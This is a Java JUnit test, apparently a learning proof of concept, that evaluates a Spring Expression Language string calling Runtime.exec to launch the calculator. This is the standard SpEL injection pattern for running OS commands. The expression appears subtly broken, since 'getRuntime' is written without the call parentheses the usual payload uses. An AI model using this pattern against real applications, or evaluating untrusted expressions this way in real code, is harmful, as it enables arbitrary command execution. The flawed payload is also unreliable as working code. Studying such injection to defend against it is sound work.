package org.Rce;

import org.junit.Test;
import org.springframework.expression.Expression;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class TestSpEL {
    @Test
        public  void test1(){
            SpelExpressionParser spelExpressionParser = new SpelExpressionParser();
            String exp="T(java.lang.Runtime).getRuntime.exec(\"calc\")";
            Expression expression = spelExpressionParser.parseExpression(exp);
            expression.getValue();
        }
}
